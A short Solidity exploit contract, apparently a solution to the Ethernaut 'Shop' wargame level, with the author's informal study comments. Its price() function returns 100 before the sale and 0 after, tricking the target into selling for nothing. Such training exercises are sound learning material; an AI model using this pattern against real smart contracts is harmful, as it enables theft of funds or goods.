 // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    
    import './Shop.sol';

    contract AttackShop is Buyer { //(remember there was a price in there ) and in that price it was a view external 
    //and I think it was virtual and if it wasn't virtual within interface they're inheretly, there's the ability to override those interfaces 
        Shop public shop;

        constructor(Shop _shop) public {
            shop = _shop;
        }

        function buy() public {
            shop.buy();
        }

        function price() public view override returns(uint) {//override is reffering to inside of the buyer interface 
            return shop.isSold() ? 0: 100; // < return 0 if "true", return 100 if "false" so we can pass the first gate 
        }
    } 
